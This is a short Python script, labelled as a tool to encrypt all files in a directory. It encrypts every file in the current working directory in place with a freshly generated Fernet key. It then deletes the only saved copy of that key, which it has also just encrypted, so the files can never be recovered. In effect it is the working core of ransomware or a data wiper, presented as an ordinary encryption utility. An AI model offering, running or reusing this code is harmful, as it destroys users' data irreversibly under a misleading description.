# enrypt all files in a directory


import os, sys, glob
from cryptography.fernet import Fernet
from cryptography.fernet import InvalidToken

def main():
    # generate a key and save it to a file
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

    # create a Fernet object
    f = Fernet(key)

    # encrypt all files in the current directory
    for file in glob.glob('*'):
        with open(file, 'rb') as original_file:
            original = original_file.read()
        encrypted = f.encrypt(original)
        with open(file, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

    # delete the key
    os.remove('key.key')

if __name__ == '__main__':
    main()
    